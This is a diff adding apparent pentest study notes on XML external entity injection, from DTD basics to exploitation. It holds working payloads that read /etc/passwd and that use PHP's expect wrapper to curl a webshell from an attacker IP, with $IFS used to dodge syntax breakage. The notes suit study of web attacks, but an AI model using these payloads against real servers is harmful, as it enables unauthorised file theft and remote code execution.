@@ -32,3 +32,65 @@ An *XML Document Type Definition* (*DTD*) allows for validation of an XML docume
 	<!ELEMENT body (#PCDATA)>
 ]>
 ```
+DTDs can be placed in the file (*usually just under the XML declaration*) but can also be referenced from another URL or external file:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email SYSTEM "email.dtd">
+```
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email SYSTEM "http://example.com/email.dtd">
+```
+
+We can also define custom entities in DTDs, this allows us to reference variables and reduce repetitive data. This uses the `ENTITY` keyword, followed by name and then value
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+	<!ENTITY company "Random Company">
+]>
+<data>&company;</data>
+```
+We can include files using this:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+	<!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
+]>
+```
+
+## LFI Through XXE
+First, we need to know if there is anything that gets reflected back to the user. If so, we can use that to inject our malicious XML into and have it reflected back. For example:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+	<email>
+		user@example.com
+	</email>
+</root>
+```
+If the email is reflected we could modify the request to:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
+<root>
+	<email>
+		&xxe;
+	</email>
+</root>
+```
+> We can try with just some text to see if its even possible before trying to read a whole file `<!ENTITY xxe "some text">`
+> We can also use things like PHP wrappers to encode files if we need as anything containing XML syntax will break this
+
+## RCE Through XXE
+Most commonly we are looking for SSH keys or trying to make the XML call out so we can grab things like NTLM hashes. But we might be able to use methods like PHP's `expect` wrapper to gain RCE. If we host a webshell on our machine, we can call it through XXE:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'ATK_IP/shell.php'"> ]> 
+<root>
+	<email>
+		&xxe;
+	</email>
+</root>
+```
+> We need to try to avoid using things that could break the syntax of XML or the code (eg. `$IFS` instead of spaces)
+> SSRF may also be possible through XXE
